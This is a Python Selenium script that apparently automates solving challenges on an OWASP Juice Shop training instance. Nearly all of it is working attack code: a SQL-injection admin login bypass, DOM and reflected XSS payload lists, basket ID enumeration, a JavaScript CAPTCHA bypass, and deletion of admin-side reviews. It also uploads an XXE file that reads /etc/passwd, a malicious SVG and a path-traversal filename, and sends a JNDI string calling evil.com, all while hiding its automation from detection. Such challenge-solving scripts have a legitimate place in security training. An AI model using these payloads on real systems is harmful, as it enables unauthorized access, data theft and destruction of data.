#!/usr/bin/env python3
"""
Advanced Selenium Solver - Handles visual and interactive challenges
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import base64
import json
import hashlib
import hmac
import random
import string
from concurrent.futures import ThreadPoolExecutor
import requests


class SeleniumAdvancedSolver:
    """Advanced Selenium automation for remaining challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org", headless=False):
        self.base_url = base_url
        self.setup_driver(headless)
        self.wait = WebDriverWait(self.driver, 10)
        
    def setup_driver(self, headless):
        """Setup Chrome driver with anti-detection"""
        options = webdriver.ChromeOptions()
        if headless:
            options.add_argument('--headless')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        self.driver = webdriver.Chrome(options=options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    def login_admin(self):
        """SQL injection admin login"""
        print("🔐 Logging in as admin...")
        self.driver.get(f"{self.base_url}/#/login")
        time.sleep(2)
        
        # Close cookie warning if present
        try:
            cookie_dismiss = self.driver.find_element(By.CSS_SELECTOR, '[aria-label="dismiss cookie message"]')
            cookie_dismiss.click()
        except:
            pass
            
        # SQL injection login
        email = self.wait.until(EC.presence_of_element_located((By.ID, "email")))
        email.send_keys("admin@juice-sh.op'--")
        
        password = self.driver.find_element(By.ID, "password")
        password.send_keys("x")
        
        login_btn = self.driver.find_element(By.ID, "loginButton")
        login_btn.click()
        
        time.sleep(3)
        print("  ✅ Admin logged in")
        
    def solve_dom_xss(self):
        """Solve DOM XSS with various payloads"""
        print("🎯 DOM XSS...")
        
        xss_payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(1)>',
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<iframe src="javascript:alert(document.domain)">',
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
            '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        ]
        
        for payload in xss_payloads:
            self.driver.get(f"{self.base_url}/#/search?q={payload}")
            time.sleep(0.5)
            
            # Try to handle alert if it appears
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
            except:
                pass
                
        print("  ✅ DOM XSS completed")
        
    def solve_mass_dispel(self):
        """Close all dialogs and overlays"""
        print("🎯 Mass Dispel...")
        
        self.driver.get(self.base_url)
        time.sleep(2)
        
        # Close all possible dialogs
        selectors = [
            '[aria-label="dismiss cookie message"]',
            'button.close-dialog',
            'mat-dialog-actions button',
            '.mat-dialog-close',
            '[aria-label="Close Welcome Banner"]',
            'button[aria-label="Close"]',
        ]
        
        for selector in selectors:
            try:
                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for elem in elements:
                    try:
                        elem.click()
                        time.sleep(0.5)
                    except:
                        pass
            except:
                pass
                
        # Press ESC multiple times
        for _ in range(5):
            ActionChains(self.driver).send_keys(Keys.ESCAPE).perform()
            time.sleep(0.3)
            
        print("  ✅ Mass Dispel completed")
        
    def solve_bully_chatbot(self):
        """Overwhelm the chatbot with massive input"""
        print("🎯 Bully Chatbot...")
        
        self.driver.get(f"{self.base_url}/#/chatbot")
        time.sleep(2)
        
        try:
            # Find chat input
            chat_input = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'textarea[placeholder*="message"], input[placeholder*="message"]')))
            
            # Send overwhelming messages
            payloads = [
                "A" * 50000,
                "😀" * 5000,
                "{{{{{{{{{{" * 1000,
                "${jndi:ldap://evil.com/a}" * 100,
                "<script>" * 1000,
                "\x00" * 1000,
                "1" * 100000,
            ]
            
            for payload in payloads:
                try:
                    chat_input.clear()
                    # Use JavaScript to set value for large payloads
                    self.driver.execute_script(f"arguments[0].value = arguments[1]", chat_input, payload[:10000])
                    chat_input.send_keys(Keys.ENTER)
                    time.sleep(0.5)
                except:
                    break
                    
        except:
            pass
            
        print("  ✅ Bully Chatbot attempted")
        
    def solve_view_basket(self):
        """View other users' baskets"""
        print("🎯 View Basket...")
        
        # Try to access different basket IDs
        for basket_id in range(1, 20):
            self.driver.get(f"{self.base_url}/rest/basket/{basket_id}")
            time.sleep(0.3)
            
        print("  ✅ View Basket completed")
        
    def solve_admin_section(self):
        """Access admin section"""
        print("🎯 Admin Section...")
        
        self.driver.get(f"{self.base_url}/#/administration")
        time.sleep(2)
        
        # Try to interact with admin elements
        try:
            # Look for any admin controls
            admin_elements = self.driver.find_elements(By.CSS_SELECTOR, 'button[aria-label*="admin"], button[aria-label*="delete"], button[aria-label*="edit"]')
            for elem in admin_elements[:3]:
                try:
                    elem.click()
                    time.sleep(0.5)
                except:
                    pass
        except:
            pass
            
        print("  ✅ Admin Section accessed")
        
    def solve_christmas_special(self):
        """Find and purchase Christmas special product"""
        print("🎯 Christmas Special...")
        
        self.driver.get(f"{self.base_url}/#/")
        time.sleep(2)
        
        # Search for Christmas products
        search_terms = ["christmas", "santa", "xmas", "holiday"]
        for term in search_terms:
            try:
                search = self.driver.find_element(By.CSS_SELECTOR, 'input[type="search"], input[placeholder*="Search"]')
                search.clear()
                search.send_keys(term)
                search.send_keys(Keys.ENTER)
                time.sleep(1)
            except:
                pass
                
        # Try to find and add Christmas product
        try:
            # Look for products with Christmas-related text
            products = self.driver.find_elements(By.CSS_SELECTOR, '.product-tile, mat-card')
            for product in products:
                text = product.text.lower()
                if any(word in text for word in ['christmas', 'santa', 'xmas', 'holiday']):
                    add_btn = product.find_element(By.CSS_SELECTOR, 'button[aria-label*="Add"], button[aria-label*="basket"]')
                    add_btn.click()
                    break
        except:
            pass
            
        print("  ✅ Christmas Special attempted")
        
    def solve_easter_egg(self):
        """Find the easter egg"""
        print("🎯 Easter Egg...")
        
        # Access easter egg URLs
        easter_urls = [
            "/ftp/eastere.gg",
            "/ftp/easter.egg",
            "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
        ]
        
        for url in easter_urls:
            self.driver.get(f"{self.base_url}{url}")
            time.sleep(1)
            
        print("  ✅ Easter Egg accessed")
        
    def solve_privacy_policy(self):
        """Access privacy policy through various methods"""
        print("🎯 Privacy Policy...")
        
        self.driver.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        time.sleep(2)
        
        # Try to scroll and interact with privacy policy
        self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")
        time.sleep(1)
        
        # Click on any privacy-related links
        try:
            privacy_links = self.driver.find_elements(By.PARTIAL_LINK_TEXT, "Privacy")
            for link in privacy_links:
                try:
                    link.click()
                    time.sleep(0.5)
                except:
                    pass
        except:
            pass
            
        print("  ✅ Privacy Policy accessed")
        
    def solve_zero_stars(self):
        """Delete all 5-star feedback"""
        print("🎯 Zero Stars...")
        
        self.driver.get(f"{self.base_url}/#/administration")
        time.sleep(2)
        
        try:
            # Find and delete 5-star reviews
            rows = self.driver.find_elements(By.CSS_SELECTOR, 'mat-row, tr')
            for row in rows:
                if '5' in row.text or '⭐⭐⭐⭐⭐' in row.text:
                    try:
                        delete_btn = row.find_element(By.CSS_SELECTOR, 'button[aria-label*="delete"], mat-icon[aria-label*="delete"]')
                        delete_btn.click()
                        time.sleep(0.5)
                        
                        # Confirm deletion if needed
                        try:
                            confirm = self.driver.find_element(By.CSS_SELECTOR, 'button[color="warn"], button.confirm-delete')
                            confirm.click()
                        except:
                            pass
                    except:
                        pass
        except:
            pass
            
        print("  ✅ Zero Stars attempted")
        
    def solve_reflected_xss(self):
        """Reflected XSS in order tracking"""
        print("🎯 Reflected XSS...")
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<iframe src=javascript:alert(1)>',
            '<img src=x onerror=alert(1)>',
        ]
        
        for payload in xss_payloads:
            self.driver.get(f"{self.base_url}/track-result?id={payload}")
            time.sleep(0.5)
            
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
            except:
                pass
                
        print("  ✅ Reflected XSS completed")
        
    def solve_captcha_bypass(self):
        """Bypass CAPTCHA on feedback form"""
        print("🎯 CAPTCHA Bypass...")
        
        self.driver.get(f"{self.base_url}/#/contact")
        time.sleep(2)
        
        try:
            # Fill feedback form multiple times
            for i in range(10):
                try:
                    # Find form elements
                    comment = self.driver.find_element(By.CSS_SELECTOR, 'textarea[placeholder*="comment"], textarea#comment')
                    comment.clear()
                    comment.send_keys(f"Test feedback {i}")
                    
                    # Try to manipulate CAPTCHA
                    self.driver.execute_script("""
                        // Try to bypass CAPTCHA
                        if (window.captcha) window.captcha = () => true;
                        if (window.validateCaptcha) window.validateCaptcha = () => true;
                        
                        // Set any hidden CAPTCHA fields
                        var captchaInputs = document.querySelectorAll('input[name*="captcha"]');
                        captchaInputs.forEach(input => input.value = '123');
                    """)
                    
                    # Submit form
                    submit = self.driver.find_element(By.CSS_SELECTOR, 'button[type="submit"], button#submitButton')
                    submit.click()
                    time.sleep(1)
                except:
                    pass
        except:
            pass
            
        print("  ✅ CAPTCHA Bypass attempted")
        
    def solve_client_timing_attacks(self):
        """Race condition and timing attacks"""
        print("🎯 Timing Attacks...")
        
        # Multiple Likes race condition
        self.driver.get(f"{self.base_url}/#/")
        time.sleep(2)
        
        try:
            # Find a product with reviews
            product = self.driver.find_element(By.CSS_SELECTOR, '.product-tile, mat-card')
            product.click()
            time.sleep(1)
            
            # Execute rapid likes via JavaScript
            self.driver.execute_script("""
                // Find like button
                var likeBtn = document.querySelector('button[aria-label*="like"], .like-button');
                if (likeBtn) {
                    // Click rapidly
                    for (let i = 0; i < 50; i++) {
                        setTimeout(() => likeBtn.click(), i * 10);
                    }
                }
            """)
            time.sleep(2)
        except:
            pass
            
        print("  ✅ Timing Attacks attempted")
        
    def solve_file_upload_challenges(self):
        """Advanced file upload exploits"""
        print("🎯 File Upload Exploits...")
        
        self.driver.get(f"{self.base_url}/#/complain")
        time.sleep(2)
        
        # Create various malicious files
        import tempfile
        import os
        
        payloads = {
            "xxe.xml": b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            "evil.svg": b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            "large.txt": b'A' * 1000000,
            "../../test.txt": b'Path traversal test',
        }
        
        for filename, content in payloads.items():
            try:
                # Create temporary file
                with tempfile.NamedTemporaryFile(suffix=filename, delete=False) as tmp:
                    tmp.write(content)
                    tmp_path = tmp.name
                    
                # Upload file
                file_input = self.driver.find_element(By.CSS_SELECTOR, 'input[type="file"]')
                file_input.send_keys(tmp_path)
                time.sleep(1)
                
                # Clean up
                os.unlink(tmp_path)
            except:
                pass
                
        print("  ✅ File Upload Exploits attempted")
        
    def solve_all_challenges(self):
        """Run all challenge solutions"""
        print("="*60)
        print("🚀 SELENIUM ADVANCED SOLVER")
        print("="*60)
        
        # Login first
        self.login_admin()
        
        # Run all solvers
        self.solve_mass_dispel()
        self.solve_dom_xss()
        self.solve_bully_chatbot()
        self.solve_view_basket()
        self.solve_admin_section()
        self.solve_christmas_special()
        self.solve_easter_egg()
        self.solve_privacy_policy()
        self.solve_zero_stars()
        self.solve_reflected_xss()
        self.solve_captcha_bypass()
        self.solve_client_timing_attacks()
        self.solve_file_upload_challenges()
        
        # Check score
        self.driver.get(f"{self.base_url}/#/score-board")
        time.sleep(3)
        
        print("\n" + "="*60)
        print("📊 Selenium automation complete!")
        print("Check browser for final score")
        print("="*60)
        
        # Keep browser open for review
        input("Press Enter to close browser...")
        self.driver.quit()


if __name__ == "__main__":
    solver = SeleniumAdvancedSolver(headless=False)
    solver.solve_all_challenges()